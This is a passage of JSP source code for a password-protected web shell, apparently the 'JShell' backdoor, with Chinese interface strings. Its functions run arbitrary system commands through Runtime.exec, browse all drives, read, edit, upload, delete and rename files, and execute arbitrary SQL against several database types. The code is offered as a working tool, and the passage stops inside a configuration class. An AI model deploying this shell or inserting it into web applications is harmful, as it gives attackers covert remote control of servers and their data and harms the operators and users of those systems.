<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*"%>
<%@ page import="java.util.Map"%>
<%@ page import="java.util.HashMap"%>
<%@ page import="java.nio.charset.Charset"%>
<%@ page import="java.util.regex.*"%>
<%@ page import="java.sql.*"%>
<%!
private String _password = "diroverflow";
private String _encodeType = "GB2312";
private int _sessionOutTime = 20;
private String[] _textFileTypes = {"txt", "htm", "html", "asp", "jsp", "java", "js", "css", "c", "cpp", "sh", "pl", "cgi", "php", "conf", "xml", "xsl", "ini", "vbs", "inc"};
private Connection _dbConnection = null;
private Statement _dbStatement = null;
private String _url = null;

public boolean validate(String password) {
	if (password.equals(_password)) {
		return true;
	} else {
		return false;
	}
}

public String HTMLEncode(String str) {
	str = str.replaceAll(" ", "&nbsp;");
	str = str.replaceAll("<", "&lt;");
	str = str.replaceAll(">", "&gt;");
	str = str.replaceAll("\r\n", "<br>");
	
	return str;
}

public String Unicode2GB(String str) {
	String sRet = null;
	
	try {
		sRet = new String(str.getBytes("ISO8859_1"), _encodeType);
	} catch (Exception e) {
		sRet = str;
	}
	
	return sRet;
}

public String exeCmd(String cmd) {
	Runtime runtime = Runtime.getRuntime();
	Process proc = null;
	String retStr = "";
	InputStreamReader insReader = null;
	char[] tmpBuffer = new char[1024];
	int nRet = 0;
	
	try {
		proc = runtime.exec(cmd);
		insReader = new InputStreamReader(proc.getInputStream(), Charset.forName("GB2312"));
		
		while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {
			retStr += new String(tmpBuffer, 0, nRet);
		}
		
		insReader.close();
		retStr = HTMLEncode(retStr);
	} catch (Exception e) {
		retStr = "<font color=\"red\">bad command \"" + cmd + "\"</font>";
	} finally {
		return retStr;
	}
}

public String pathConvert(String path) {
	String sRet = path.replace('\\', '/');
	File file = new File(path);
	
	if (file.getParent() != null) {
		if (file.isDirectory()) {
			if (! sRet.endsWith("/"))
				sRet += "/";
		}
	} else {
		if (! sRet.endsWith("/"))
			sRet += "/";	
	}
	
	return sRet;
}

public String strCut(String str, int len) {
	String sRet;
	
	len -= 3;
	
	if (str.getBytes().length <= len) {
		sRet = str;
	} else {
		try {
			sRet = (new String(str.getBytes(), 0, len, "GBK")) + "...";
		} catch (Exception e) {
			sRet = str;
		}
	}
	
	return sRet;
}

public String listFiles(String path, String curUri) {
	File[] files = null;
	File curFile = null;
	String sRet = null;
	int n = 0;
	boolean isRoot = path.equals("");
	
	path = pathConvert(path);
	
	try {
		if (isRoot) {
			files = File.listRoots();
		} else {
			try {
				curFile = new File(path);
				String[] sFiles = curFile.list();
				files = new File[sFiles.length];
					
				for (n = 0; n < sFiles.length; n ++) {
					files[n] = new File(path + sFiles[n]);
				}
			} catch (Exception e) {
				sRet = "<font color=\"red\">bad path \"" + path + "\"</font>";
			}
		}
		
		if (sRet == null) {
			sRet = "\n";
			sRet += "<script language=\"javascript\">\n";
			sRet += "var selectedFile = null;\n";
			sRet += "<!--\n";
			sRet += "function createFolder() {\n";
			sRet += "	var folderName = prompt(\"&#35831;&#36755;&#20837;&#30446;&#24405;&#21517;\", \"\");\n";
			sRet += "	if (folderName != null && folderName != false && ltrim(folderName) != \"\") {\n";
			sRet += "		window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFolder&folderName=\" + folderName + \"" + "\";\n";
			sRet += "	}\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function createFile() {\n";
			sRet += "	var fileName = prompt(\"&#35831;&#36755;&#20837;&#25991;&#20214;&#21517;\", \"\");\n";
			sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
			sRet += "		window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFile&fileName=\" + fileName + \"" + "\";\n";
			sRet += "	}\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function selectFile(obj) {\n";
			sRet += "	if (selectedFile != null)\n";
			sRet += "		selectedFile.style.backgroundColor = \"#FFFFFF\";\n";
			sRet += "	selectedFile = obj;\n";
			sRet += "	obj.style.backgroundColor = \"#CCCCCC\";\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function change(obj) {\n";
			sRet += "	if (selectedFile != obj)\n";
			sRet += "		obj.style.backgroundColor = \"#CCCCCC\";\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function restore(obj) {\n";
			sRet += "	if (selectedFile != obj)\n";
			sRet += "		obj.style.backgroundColor = \"#FFFFFF\";\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function showUpload() {\n";
			sRet += "	up.style.visibility = \"visible\";\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function copyFile() {\n";
			sRet += "	var toPath = prompt(\"&#35831;&#36755;&#20837;&#35201;&#22797;&#21046;&#21040;&#30340;&#30446;&#24405;(&#32477;&#23545;&#36335;&#24452;)\", \"\");\n";
			sRet += "	if (toPath != null && toPath != false && ltrim(toPath) != \"\") {\n";
			sRet += "		document.fileList.action = \"" + curUri + "&curPath=" + path + "&fsAction=copyto&dstPath=" + "\" + toPath;\n";
			sRet += "		document.fileList.submit();\n";
			sRet += "	}\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "function rename() {\n";
			sRet += "	var count = 0;\n";
			sRet += "	var selected = -1;\n";
			sRet += "	for (var i = 0; i < document.fileList.filesDelete.length; i ++) {\n";
			sRet += "		if (document.fileList.filesDelete[i].checked) {\n";
			sRet += "			count ++;\n";
			sRet += "			selected = i;\n";
			sRet += "		}\n";
			sRet += "	}\n";
			sRet += "	if (count > 1)\n";
			sRet += "		alert(\"&#19981;&#33021;&#37325;&#21629;&#21517;&#22810;&#20010;&#25991;&#20214;\");\n";
			sRet += "	else if (selected == -1)\n";
			sRet += "		alert(\"&#27809;&#26377;&#36873;&#20013;&#35201;&#37325;&#21629;&#21517;&#30340;&#25991;&#20214;\");\n";
			sRet += "	else {\n";
			sRet += "		var newName = prompt(\"&#35831;&#36755;&#20837;&#26032;&#25991;&#20214;&#21517;\", \"\");\n";
			sRet += "		if (newName != null && newName != false && ltrim(newName) != \"\") {\n";
			sRet += "			window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=rename&newName=\" + newName + \"&fileRename=\" + document.fileList.filesDelete[selected].value;";
			sRet += "		}\n";
			sRet += "	}\n";
			sRet += "}\n";
			sRet += "\n";
			sRet += "//-->\n";
			sRet += "</script>\n";
			sRet += "<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellpadding=\"1\">\n";
			sRet += "	<form enctype=\"multipart/form-data\" method=\"post\" name=\"upload\" action=\"" + curUri + "&curPath=" + path + "&fsAction=upload" + "\">\n";
			
			if (curFile != null) {
				sRet += "	<tr>\n";
				sRet += "		<td colspan=\"4\" valign=\"middle\">\n";
				sRet += "			&nbsp;<a href=\"" + curUri + "&curPath=" + (curFile.getParent() == null ? "" : pathConvert(curFile.getParent())) + "\">&#19978;&#32423;&#30446;&#24405;</a>&nbsp;";
				sRet += "<a href=\"#\" onclick=\"javascript:createFolder()\">&#21019;&#24314;&#30446;&#24405;</a>&nbsp;";
				sRet += "<a href=\"#\" onclick=\"javascript:createFile()\">&#26032;&#24314;&#25991;&#20214;</a>&nbsp;";
				sRet += "<a href=\"#\" onclick=\"javascript:document.fileList.submit();\">&#21024;&#38500;</a>&nbsp;";
				sRet += "<a href=\"#\" onclick=\"javascript:copyFile()\">&#22797;&#21046;</a>&nbsp;";
				sRet += "<a href=\"#\" onclick=\"javascript:rename()\">&#37325;&#21629;&#21517;</a>&nbsp;";
				sRet += "<a href=\"#\" onclick=\"javascript:showUpload()\">&#19978;&#20256;&#25991;&#20214;</a>\n";
				sRet += "<span style=\"visibility: hidden\" id=\"up\"><input type=\"file\" value=\"&#19978;&#20256;\" name=\"upFile\" size=\"8\" class=\"textbox\" />&nbsp;<input type=\"submit\" value=\"&#19978;&#20256;\" class=\"button\"></span>\n";
				sRet += "		</td>\n";
				sRet += "	</tr>\n";
			}
			
			sRet += "</form>\n";
			
			sRet += "	<form name=\"fileList\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=deleteFile" + "\">\n";
			
			for (n = 0; n < files.length; n ++) {
				sRet += "	<tr onclick=\"javascript: selectFile(this)\" onmouseover=\"javascript: change(this)\" onmouseout=\"javascript: restore(this)\" style=\"cursor:hand;\">\n";
				
				if (! isRoot) {
					sRet += "		<td width=\"5%\" align=\"center\"><input type=\"checkbox\" name=\"filesDelete\" value=\"" + pathConvert(files[n].getPath()) + "\" /></td>\n";
					if (files[n].isDirectory()) {
						sRet += "		<td><a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "\" title=\"" + files[n].getName() + "\">&lt;" + strCut(files[n].getName(), 50) + "&gt;</a></td>\n";
					} else {
						sRet += "		<td><a title=\"" + files[n].getName() + "\">" + strCut(files[n].getName(), 50) + "</a></td>\n";
					}
					
					sRet += "		<td width=\"15%\" align=\"center\">" + (files[n].isDirectory() ? "&lt;dir&gt;" : "") + ((! files[n].isDirectory()) && isTextFile(getExtName(files[n].getPath())) ? "<<a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "&fsAction=open" + "\">edit</a>>" : "") + "</td>\n";
					sRet += "		<td width=\"15%\" align=\"center\">" + files[n].length() + "</td>\n";
				} else {
					sRet += "		<td><a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "\" title=\"" + files[n].getName() + "\">" + pathConvert(files[n].getPath()) + "</a></td>\n";
				}
	
				sRet += "	</tr>\n";
			}
			sRet += "	</form>\n";
			sRet += "</table>\n";
		}
	} catch (SecurityException e) {
		sRet = "<font color=\"red\">security violation, no privilege.</font>";
	}
	
	return sRet;
}

public boolean isTextFile(String extName) {
	int i;
	boolean bRet = false;
	
	if (! extName.equals("")) {
		for (i = 0; i < _textFileTypes.length; i ++) {
			if (extName.equals(_textFileTypes[i])) {
				bRet = true;
				break;
			}
		}
	} else {
		bRet = true;
	}
	
	return bRet;
}

public String getExtName(String fileName) {
	String sRet = "";
	int	nLastDotPos;
	
	fileName = pathConvert(fileName);
	
	nLastDotPos = fileName.lastIndexOf(".");
	
	if (nLastDotPos == -1) {
		sRet = "";
	} else {
		sRet = fileName.substring(nLastDotPos + 1);
	}
	
	return sRet;
}

public String browseFile(String path) {
	String sRet = "";
	File file = null;
	FileReader fileReader = null;
	
	path = pathConvert(path);
	
	try {
		file = new File(path);
		fileReader = new FileReader(file);
		String fileString = "";
		char[] chBuffer = new char[1024];
		int ret;
		
		sRet = "<script language=\"javascript\">\n";
		
		while ((ret = fileReader.read(chBuffer, 0, 1024)) != -1) {
			fileString += new String(chBuffer, 0, ret);
		}
		
		sRet += "var wnd = window.open(\"about:blank\", \"_blank\", \"width=600, height=500\");\n";
		sRet += "var doc = wnd.document;\n";
		sRet += "doc.write(\"" + "aaa" + "\");\n";
		
		sRet += "</script>\n";
		
	} catch (IOException e) {
		sRet += "<script language=\"javascript\">\n";
		sRet += "alert(\"&#25171;&#24320;&#25991;&#20214;" + path + "&#22833;&#36133;\");\n";
		sRet += "</script>\n";
	}
	
	return sRet;
}

public String openFile(String path, String curUri) {
	String sRet = "";
	boolean canOpen = false;
	int nLastDotPos = path.lastIndexOf(".");
	String extName = "";
	String fileString = null;
	File curFile = null;
	
	path = pathConvert(path);
	
	if (nLastDotPos == -1) {
		canOpen = true;
	} else {
		extName = path.substring(nLastDotPos + 1);
		canOpen = isTextFile(extName);
	}
	
	if (canOpen) {
		try {
			fileString = "";
			curFile = new File(path);
			FileReader fileReader = new FileReader(curFile);
			char[] chBuffer = new char[1024];
			int nRet;
			
			while ((nRet = fileReader.read(chBuffer, 0, 1024)) != -1) {
				fileString += new String(chBuffer, 0, nRet);
			}
			
			fileReader.close();
		} catch (IOException e) {
			fileString = null;
			sRet = "<font color=\"red\">&#19981;&#33021;&#25171;&#24320;&#25991;&#20214;\"" + path + "\"</font>";
		} catch (SecurityException e) {
			fileString = null;
			sRet = "<font color=\"red\">&#23433;&#20840;&#38382;&#39064;&#65292;&#27809;&#26377;&#26435;&#38480;&#25191;&#34892;&#35813;&#25805;&#20316;</font>";
		}
	} else {
		sRet = "<font color=\"red\">file \"" + path + "\" is not a text file, can't be opened in text mode</font>";
	}
	
	if (fileString != null) {
		sRet += "<script language=\"javascript\">";
		sRet += "<!--\n";
		sRet += "function saveAs() {\n";
		sRet += "	var fileName = prompt(\"&#35831;&#36755;&#20837;&#25991;&#20214;&#21517;\", \"\");\n";
		sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
		sRet += "		document.openfile.action=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\" + fileName + \"&fsAction=saveAs\";\n";
		sRet += "		document.openfile.submit();\n";
		sRet += "	}\n";
		sRet += "}\n";
		sRet += "//-->\n";
		sRet += "</script>\n";
		sRet += "<table align=\"center\" width=\"100%\" cellpadding=\"2\" cellspacing=\"1\">\n";
		sRet += "	<form name=\"openfile\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=save" + "\">\n";
		sRet += "	<tr>\n";
		sRet += "		<td>[<a href=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\">&#19978;&#32423;&#30446;&#24405;</a>]</td>\n";
		sRet += "	</tr>\n";
		sRet += "	<tr>\n";
		sRet += "		<td align=\"center\">\n";
		sRet += "			<textarea name=\"fileContent\" cols=\"80\" rows=\"32\">\n";
		sRet += fileString;
		sRet += "			</textarea>\n";
		sRet += "		</td>\n";
		sRet += "	</tr>\n";
		sRet += "	<tr>\n";
		sRet += "		<td align=\"center\"><input type=\"submit\" class=\"button\" value=\"&#20445;&#23384;\" />&nbsp;<input type=\"button\" class=\"button\" value=\"&#21478;&#23384;&#20026;\" onclick=\"javascript:saveAs()\" /></td>\n";
		sRet += "	</tr>\n";
		sRet += "	</form>\n";
		sRet += "</table>\n";
	}
	
	return sRet;
}

public String saveFile(String path, String curUri, String fileContent) {
	String sRet = "";
	File file = null;
	
	path = pathConvert(path);
	
	try {
		file = new File(path);
		
		if (! file.canWrite()) {
			sRet = "<font color=\"red\">&#25991;&#20214;&#19981;&#21487;&#20889;</font>";
		} else {
			FileWriter fileWriter = new FileWriter(file);
			fileWriter.write(fileContent);
			
			fileWriter.close();
			sRet = "&#25991;&#20214;&#20445;&#23384;&#25104;&#21151;&#65292;&#27491;&#22312;&#36820;&#22238;&#65292;&#35831;&#31245;&#20505;\n";
			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />\n";	
		}
	} catch (IOException e) {
		sRet = "<font color=\"red\">&#20445;&#23384;&#25991;&#20214;&#22833;&#36133;</font>";
	} catch (SecurityException e) {
		sRet = "<font color=\"red\">&#23433;&#20840;&#38382;&#39064;&#65292;&#27809;&#26377;&#26435;&#38480;&#25191;&#34892;&#35813;&#25805;&#20316;</font>";
	}
	
	return sRet;
}

public String createFolder(String path, String curUri, String folderName) {
	String sRet = "";
	File folder = null;
	
	path = pathConvert(path);
	
	try {
		folder = new File(path + folderName);
		
		if (folder.exists() && folder.isDirectory()) {
			sRet = "<font color=\"red\">\"" + path + folderName + "\"&#30446;&#24405;&#24050;&#32463;&#23384;&#22312;</font>";
		} else {
			if (folder.mkdir()) {
				sRet = "&#25104;&#21151;&#21019;&#24314;&#30446;&#24405;\"" + pathConvert(folder.getPath()) + "\"&#65292;&#27491;&#22312;&#36820;&#22238;&#65292;&#35831;&#31245;&#20505;\n";
					sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + folderName + "\" />";
			} else {
				sRet = "<font color=\"red\">&#21019;&#24314;&#30446;&#24405;\"" + folderName + "\"&#22833;&#36133;</font>";
			}
		}
	} catch (SecurityException e) {
		sRet = "<font color=\"red\">&#23433;&#20840;&#38382;&#39064;&#65292;&#27809;&#26377;&#26435;&#38480;&#25191;&#34892;&#35813;&#25805;&#20316;</font>";
	}
	
	return sRet;
}

public String createFile(String path, String curUri, String fileName) {
	String sRet = "";
	File file = null;
	
	path = pathConvert(path);
	
	try {
		file = new File(path + fileName);
		
		if (file.createNewFile()) {
			sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + fileName + "&fsAction=open" + "\" />";
		} else {
			sRet = "<font color=\"red\">\"" + path + fileName + "\"&#25991;&#20214;&#24050;&#32463;&#23384;&#22312;</font>";
		}
	} catch (SecurityException e) {
		sRet = "<font color=\"red\">&#23433;&#20840;&#38382;&#39064;&#65292;&#27809;&#26377;&#26435;&#38480;&#25191;&#34892;&#35813;&#25805;&#20316;</font>";
	} catch (IOException e) {
		sRet = "<font color=\"red\">&#21019;&#24314;&#25991;&#20214;\"" + path + fileName + "\"&#22833;&#36133;</font>";
	}
	
	return sRet;
} 

public String deleteFile(String path, String curUri, String[] files2Delete) {
	String sRet = "";
	File tmpFile = null;
	
	try {
		for (int i = 0; i < files2Delete.length; i ++) {
			tmpFile = new File(files2Delete[i]);
			if (! tmpFile.delete()) {
				sRet += "<font color=\"red\">&#21024;&#38500;\"" + files2Delete[i] + "\"&#22833;&#36133;</font><br>\n";
			}
		}
		
		if (sRet.equals("")) {
			sRet = "&#21024;&#38500;&#25104;&#21151;&#65292;&#27491;&#22312;&#36820;&#22238;&#65292;&#35831;&#31245;&#20505;\n";
			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
		}
	} catch (SecurityException e) {
		sRet = "<font color=\"red\">&#23433;&#20840;&#38382;&#39064;&#65292;&#27809;&#26377;&#26435;&#38480;&#25191;&#34892;&#35813;&#25805;&#20316;</font>\n";
	}
	
	return sRet;
}

public String saveAs(String path, String curUri, String fileContent) {
	String sRet = "";
	File file = null;
	FileWriter fileWriter = null;
	
	try {
		file = new File(path);
		
		if (file.createNewFile()) {
			fileWriter = new FileWriter(file);
			fileWriter.write(fileContent);
			fileWriter.close();
			
			sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />";
		} else {
			sRet = "<font color=\"red\">&#25991;&#20214;\"" + path + "\"&#24050;&#32463;&#23384;&#22312;</font>";
		}
	} catch (IOException e) {
		sRet = "<font color=\"red\">&#21019;&#24314;&#25991;&#20214;\"" + path + "\"&#22833;&#36133;</font>";
	}	
	
	return sRet;
}


public String uploadFile(ServletRequest request, String path, String curUri) {
	String sRet = "";
	File file = null;
	InputStream in = null;
	
	path = pathConvert(path);
	
	try {
		in = request.getInputStream();
		
		byte[] inBytes = new byte[request.getContentLength()];
		int nBytes;
		int start = 0;
		int end = 0;
		int size = 1024;
		String token = null;
		String filePath = null;

		//
		// &#25226;&#36755;&#20837;&#27969;&#35835;&#20837;&#19968;&#20010;&#23383;&#33410;&#25968;&#32452;
		//
		while ((nBytes = in.read(inBytes, start, size)) != -1) {
			start += nBytes;
		}
		
		in.close();
		//
		// &#20174;&#23383;&#33410;&#25968;&#32452;&#20013;&#24471;&#21040;&#25991;&#20214;&#20998;&#38548;&#31526;&#21495;
		//
		int i = 0;
		byte[] seperator;
		
		while (inBytes[i] != 13) {
			i ++;
		}
		
		seperator =  new byte[i];
	
		for (i = 0; i < seperator.length; i ++) {
			seperator[i] = inBytes[i];
		}
		
		//
		// &#24471;&#21040;Header&#37096;&#20998;
		//
		String dataHeader = null;
		i += 3;
		start = i;
		while (! (inBytes[i] == 13 && inBytes[i + 2] == 13)) {
			i ++;
		}
		end = i - 1;
		dataHeader = new String(inBytes, start, end - start + 1);
		
		//
		// &#24471;&#21040;&#25991;&#20214;&#21517;
		//
		token = "filename=\"";
		start = dataHeader.indexOf(token) + token.length();
		token = "\"";
		end = dataHeader.indexOf(token, start) - 1;
		filePath = dataHeader.substring(start, end + 1);
		filePath = 	pathConvert(filePath);
		String fileName = filePath.substring(filePath.lastIndexOf("/") + 1);
		
		//
		// &#24471;&#21040;&#25991;&#20214;&#20869;&#23481;&#24320;&#22987;&#20301;&#32622;
		//	
		i += 4;
		start = i;
		
		/*
		boolean found = true;		
		byte[] tmp = new byte[seperator.length];
		while (i <= inBytes.length - 1 - seperator.length) {
		
			for (int j = i; j < i + seperator.length; j ++) { 
				if (seperator[j - i] != inBytes[j]) {
					found = false;
					break;
				} else
					tmp[j - i] = inBytes[j];
			}
			
			if (found)
				break;
			
			i ++;
		}*/
		
		//
		// &#20599;&#25042;&#30340;&#21150;&#27861;
		//
		end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;
		
		//
		// &#20445;&#23384;&#20026;&#25991;&#20214;
		//
		File newFile = new File(path + fileName);
		newFile.createNewFile();
		FileOutputStream out = new FileOutputStream(newFile);
		
		//out.write(inBytes, start, end - start + 1);
		out.write(inBytes, start, end - start + 1);
		out.close();
		
		sRet = "<script language=\"javascript\">\n";
		sRet += "alert(\"&#25991;&#20214;&#19978;&#20256;&#25104;&#21151;" + fileName + "\");\n";
		sRet += "</script>\n";
	} catch (IOException e) {
		sRet = "<script language=\"javascript\">\n";
		sRet += "alert(\"&#25991;&#20214;&#19978;&#20256;&#22833;&#36133;\");\n";
		sRet += "</script>\n";
	}
	
	sRet += "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "\" />";
	return sRet;
}

public boolean fileCopy(String srcPath, String dstPath) {
	boolean bRet = true;
	
	try {
		FileInputStream in = new FileInputStream(new File(srcPath));
		FileOutputStream out = new FileOutputStream(new File(dstPath));
		byte[] buffer = new byte[1024];
		int nBytes;
		

		while ((nBytes = in.read(buffer, 0, 1024)) != -1) {
			out.write(buffer, 0, nBytes);
		}
		
		in.close();
		out.close();
	} catch (IOException e) {
		bRet = false;
	}	
	
	return bRet;
}

public String getFileNameByPath(String path) {
	String sRet = "";
	
	path = pathConvert(path);
	
	if (path.lastIndexOf("/") != -1) {
		sRet = path.substring(path.lastIndexOf("/") + 1);
	} else {
		sRet = path;
	}
	
	return sRet;
}

public String copyFiles(String path, String curUri, String[] files2Copy, String dstPath) {
	String sRet = "";
	int i;
	
	path = pathConvert(path);
	dstPath = pathConvert(dstPath);
	
	for (i = 0; i < files2Copy.length; i ++) {
		if (! fileCopy(files2Copy[i], dstPath + getFileNameByPath(files2Copy[i]))) {
			sRet += "<font color=\"red\">&#25991;&#20214;\"" + files2Copy[i] + "\"&#22797;&#21046;&#22833;&#36133;</font><br/>";
		}
	}
	
	if (sRet.equals("")) {
		sRet = "&#25991;&#20214;&#22797;&#21046;&#25104;&#21151;&#65292;&#27491;&#22312;&#36820;&#22238;&#65292;&#35831;&#31245;&#20505;";
		sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
	}
	
	return sRet;
}

public boolean isFileName(String fileName) {
	boolean bRet = false;
	
	Pattern p = Pattern.compile("^[a-zA-Z0-9][\\w\\.]*[\\w]$");
	Matcher m = p.matcher(fileName);
	
	bRet = m.matches();
	
	return bRet;
}

public String renameFile(String path, String curUri, String file2Rename, String newName) {
	String sRet = "";
	
	path = pathConvert(path);
	file2Rename = pathConvert(file2Rename);
	
	try {
		File file = new File(file2Rename);
		
		newName = file2Rename.substring(0, file2Rename.lastIndexOf("/") + 1) + newName;
		File newFile = new File(newName);
		
		if (! file.exists()) {
			sRet = "<font color=\"red\">&#25991;&#20214;\"" + file2Rename + "\"&#19981;&#23384;&#22312;</font>";
		} else {
			file.renameTo(newFile);
			sRet = "&#25991;&#20214;&#37325;&#21629;&#21517;&#25104;&#21151;&#65292;&#27491;&#22312;&#36820;&#22238;&#65292;&#35831;&#31245;&#20505;";
			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
		}
	} catch (SecurityException e) {
		sRet = "<font color=\"red\">&#23433;&#20840;&#38382;&#39064;&#23548;&#33268;&#25991;&#20214;\"" + file2Rename + "\"&#22797;&#21046;&#22833;&#36133;</font>";
	}
	
	return sRet;
}

public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {
	boolean bRet = true;
	String driverName = "";
	
	if (dbServer.equals(""))
		dbServer = "localhost";
	
	try {
		if (dbType.equals("sqlserver")) {
			driverName = "com.microsoft.jdbc.sqlserver.SQLServerDriver";
			if (dbPort.equals(""))
				dbPort = "1433";
			_url = "jdbc:microsoft:sqlserver://" + dbServer + ":" + dbPort + ";User=" + dbUsername + ";Password=" + dbPassword + ";DatabaseName=" + dbName;
		} else if (dbType.equals("mysql")) {
			driverName = "com.mysql.jdbc.Driver";
			if (dbPort.equals(""))
				dbPort = "3306";
			_url = "jdbc:mysql://" + dbServer + ":" + dbPort + ";User=" + dbUsername + ";Password=" + dbPassword + ";DatabaseName=" + dbName;
		} else if (dbType.equals("odbc")) {
			driverName = "sun.jdbc.odbc.JdbcOdbcDriver";
			_url = "jdbc:odbc:dsn=" + dbName + ";User=" + dbUsername + ";Password=" + dbPassword;
		} else if (dbType.equals("oracle")) {
			driverName = "oracle.jdbc.driver.OracleDriver";
			_url = "jdbc:oracle:thin@" + dbServer + ":" + dbPort + ":" + dbName;
		} else if (dbType.equals("db2")) {
			driverName = "com.ibm.db2.jdbc.app.DB2Driver";
			_url = "jdbc:db2://" + dbServer + ":" + dbPort + "/" + dbName;
		}
		
		Class.forName(driverName);
	} catch (ClassNotFoundException e) {
		bRet = false;
	}
	
	return bRet;
}

public boolean DBConnect(String User, String Password) {
	boolean bRet = false;
	
	if (_url != null) {
		try {
			_dbConnection = DriverManager.getConnection(_url, User, Password);
			_dbStatement = _dbConnection.createStatement();
			bRet = true; 
		} catch (SQLException e) {
			bRet = false;
		}	
	} 
	
	return bRet;
}

public String DBExecute(String sql) {
	String sRet = "";
	
	if (_dbConnection == null || _dbStatement == null) {
		sRet = "<font color=\"red\">&#25968;&#25454;&#24211;&#27809;&#26377;&#27491;&#24120;&#36830;&#25509;</font>";
	} else {
		try {
			if (sql.toLowerCase().substring(0, 6).equals("select")) {
				ResultSet rs = _dbStatement.executeQuery(sql);
				ResultSetMetaData rsmd = rs.getMetaData();
				int colNum = rsmd.getColumnCount();
				int colType;
				
				sRet = "sql&#35821;&#21477;&#25191;&#34892;&#25104;&#21151;&#65292;&#36820;&#22238;&#32467;&#26524;<br>\n";
				sRet += "<table align=\"center\" border=\"0\" bgcolor=\"#CCCCCC\" cellpadding=\"2\" cellspacing=\"1\">\n";
				sRet +=	"    <tr bgcolor=\"#FFFFFF\">\n";
				for (int i = 1; i <= colNum; i ++) {
					sRet += "        <th>" + rsmd.getColumnName(i) + "(" + rsmd.getColumnTypeName(i) + ")</th>\n";
				}
				sRet += "    </tr>\n";
				while (rs.next()) {
					sRet += "	<tr bgcolor=\"#FFFFFF\">\n";
					for (int i = 1; i <= colNum; i ++) {
						colType = rsmd.getColumnType(i);
						
						sRet += "		<td>";
						switch (colType) {
							case Types.BIGINT:
							sRet += rs.getLong(i);
							break;
							
							case Types.BIT:
							sRet += rs.getBoolean(i);
							break;
							
							case Types.BOOLEAN:
							sRet += rs.getBoolean(i);
							break;
							
							case Types.CHAR:
							sRet += rs.getString(i);
							break;
							
							case Types.DATE:
							sRet += rs.getDate(i).toString();
							break;
							
							case Types.DECIMAL:
							sRet += rs.getDouble(i);
							break;
							
							case Types.NUMERIC:
							sRet += rs.getDouble(i);
							break;
							
							case Types.REAL:
							sRet += rs.getDouble(i);
							break;
							
							case Types.DOUBLE:
							sRet += rs.getDouble(i);
							break;
							
							case Types.FLOAT:
							sRet += rs.getFloat(i);
							break;
							
							case Types.INTEGER:
							sRet += rs.getInt(i);
							break;
							
							case Types.TINYINT:
							sRet += rs.getShort(i);
							break;
							
							case Types.VARCHAR:
							sRet += rs.getString(i);
							break;
							
							case Types.TIME:
							sRet += rs.getTime(i).toString();
							break;
							
							case Types.DATALINK:
							sRet += rs.getTimestamp(i).toString();
							break;
						}
						sRet += "		</td>\n";
					}
					sRet += "	</tr>\n"; 
				}				
				sRet += "</table>\n";
				
				rs.close();
			} else {
				if (_dbStatement.execute(sql)) {
					sRet = "sql&#35821;&#21477;&#25191;&#34892;&#25104;&#21151;";
				} else {
					sRet = "<font color=\"red\">sql&#35821;&#21477;&#25191;&#34892;&#22833;&#36133;</font>";
				}
			}
		} catch (SQLException e) {
			sRet = "<font color=\"red\">sql&#35821;&#21477;&#25191;&#34892;&#22833;&#36133;</font>";
		}
	}
	
	return sRet;
}

public void DBRelease() {
	try {
		if (_dbStatement != null) {
			_dbStatement.close();
			_dbStatement = null;
		}
		
		if (_dbConnection != null) {
			_dbConnection.close();
			_dbConnection = null;
		}
	} catch (SQLException e) {
	
	}
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

class JshellConfig {
	private String _jshellContent = null;
	private String _path = null;

	public JshellConfig(String path) throws JshellConfigException {
		_path = path;
		read();
	}
	
	private void read() throws JshellConfigException {
		try {
			FileReader jshell = new FileReader(new File(_path));
			char[] buffer = new char[1024];
			int nChars;
			_jshellContent = "";
			
			while ((nChars = jshell.read(buffer, 0, 1024)) != -1) {
				_jshellContent += new String(buffer, 0, nChars);
			}
			
			jshell.close();
		} catch (IOException e) {
			throw new JshellConfigException("&#25171;&#24320;&#25991;&#20214;&#22833;&#36133;");
		}
	}
	
	public void save() throws JshellConfigException {
		FileWriter jshell = null;
	
		try {
			jshell = new FileWriter(new File(_path));
			char[] buffer = _jshellContent.toCharArray();
			int start = 0;
			int size = 1024;
			
			for (start = 0; start < buffer.length - 1 - size; start += size) {
				jshell.write(buffer, start, size);
			}
			
			jshell.write(buffer, start, buffer.length - 1 - start);
		} catch (IOException e) {
			new JshellConfigException("&#20889;&#25991;&#20214;&#22833;&#36133;");
		} finally {
			try {
				jshell.close();
			} catch (IOException e) {
			
			}
		}
	}
	
